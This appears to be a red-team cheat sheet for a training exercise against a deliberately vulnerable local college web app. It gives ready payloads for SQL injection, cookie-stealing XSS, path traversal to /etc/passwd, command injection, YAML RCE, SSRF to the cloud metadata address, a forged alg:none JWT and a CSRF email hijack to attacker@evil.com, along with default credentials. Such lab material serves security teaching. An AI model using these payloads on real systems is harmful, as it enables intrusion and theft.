# RED TEAM CHEAT SHEET — Vidyatech Round 1
# Site: http://localhost:5000

═══════════════════════════════════════════════════════════════
 EASY VULNERABILITIES (10 pts each)
═══════════════════════════════════════════════════════════════

1. SQL INJECTION
   URL  : http://localhost:5000/login
   Field: Roll No
   Payload: ' OR '1'='1'--
   Also try: ' OR 1=1--
             admin'--
             UNION SELECT * FROM students--

2. STORED XSS
   URL  : http://localhost:5000/notices/post  (must be logged in)
   Field: Content
   Payload: <script>alert(document.cookie)</script>
   Also try: <img src=x onerror=alert(1)>
             <body onload=alert(document.cookie)>

3. DEFAULT CREDENTIALS
   URL  : http://localhost:5000/staff/login
   Try these:
     FAC001 / admin123   → Admin access
     FAC002 / faculty2024
     FAC003 / anjali@123
     FAC004 / kiran2024

4. DIRECTORY TRAVERSAL
   URL  : http://localhost:5000/resources/download?file=
   Payload: ../../etc/passwd
            ../data/db_backup_jan2024.sql
            ../../data/config.json
   Full URL: http://localhost:5000/resources/download?file=../../etc/passwd

5. SENSITIVE DATA EXPOSURE
   Visit these URLs directly:
     http://localhost:5000/robots.txt
     http://localhost:5000/.env
     http://localhost:5000/data/db_backup_jan2024.sql

6. HARDCODED ADMIN LOGIN
   URL  : http://localhost:5000/admin/login
   Username: admin
   Password: admin@123

7. UNRESTRICTED FILE UPLOAD
   URL  : http://localhost:5000/dashboard/upload-doc  (login as student first)
   Login: VTU2021001 / arjun123
   Upload any file with extension: .php .exe .sh .py .html .phtml
   Example: create a file named shell.php and upload it

8. CLICKJACKING
   Create an HTML file with this content and open in browser:
   <iframe src="http://localhost:5000/login" width="500" height="500"></iframe>

9. WEAK PASSWORD
   URL  : http://localhost:5000/account/change-password  (login first)
   New password field: type just "1" or "ab" — server accepts it

10. CSRF — EMAIL HIJACK
    Create HTML file and open in browser while victim is logged in:
    <form action="http://localhost:5000/account/update-email" method="POST">
      <input name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit()</script>

═══════════════════════════════════════════════════════════════
 INTERMEDIATE VULNERABILITIES (20 pts each)
═══════════════════════════════════════════════════════════════

11. JWT alg:none
    URL  : GET http://localhost:5000/api/me
    Step 1 — Get a real token:
      POST http://localhost:5000/api/token
      Body: {"roll_no":"VTU2021001","password":"arjun123"}
    Step 2 — Forge token with alg:none:
      Header  : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
      Payload : eyJzdHVkZW50X2lkIjoxfQ
      Sig     : (empty)
      Token   : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdHVkZW50X2lkIjoxfQ.
    Step 3 — Use it:
      GET http://localhost:5000/api/me
      Header: Authorization: Bearer <forged_token>

12. IDOR
    Login as VTU2021001 / arjun123 first, then visit:
      http://localhost:5000/api/result/3
      http://localhost:5000/api/result/4
      http://localhost:5000/api/result/5
      http://localhost:5000/api/result/6

13. COMMAND INJECTION
    URL  : http://localhost:5000/tools/nslookup
    Field: Domain
    Payload: vidyatech.edu; whoami
    Also try: google.com && cat /etc/passwd
              test.com | ls -la
              $(whoami)

═══════════════════════════════════════════════════════════════
 ADVANCED VULNERABILITIES (30 pts each)
═══════════════════════════════════════════════════════════════

14. YAML RCE
    URL  : http://localhost:5000/tools/yaml-import
    Field: YAML Input
    Payload:
      !!python/object/apply:os.system ["whoami"]
    Also try:
      !!python/object/apply:subprocess.check_output [["id"]]
      !!python/object/new:os.system ["cat /etc/passwd"]

15. DEBUG ENDPOINT + SSRF
    Part A — Debug endpoint:
      Visit: http://localhost:5000/debug
      Gets you the Flask secret key

    Part B — SSRF:
      URL  : http://localhost:5000/tools/fetch-url
      Payload: http://127.0.0.1:5000/debug
               http://127.0.0.1:5000/api/internal
               http://169.254.169.254/latest/meta-data/

═══════════════════════════════════════════════════════════════
 STUDENT LOGIN CREDENTIALS
═══════════════════════════════════════════════════════════════

  VTU2021001 / arjun123
  VTU2021002 / priya456
  VTU2021003 / rahul789
  VTU2021004 / sneha321
  VTU2022001 / dev2022

═══════════════════════════════════════════════════════════════
 SCORING
═══════════════════════════════════════════════════════════════

  Easy (1-10)          10 pts each   max 100 pts
  Intermediate (11-13) 20 pts each   max  60 pts
  Advanced (14-15)     30 pts each   max  60 pts
  TOTAL MAX                          220 pts

  If Blue Team patches a vuln your attack is BLOCKED = 0 pts
  Try all 15 before Blue Team patches them!
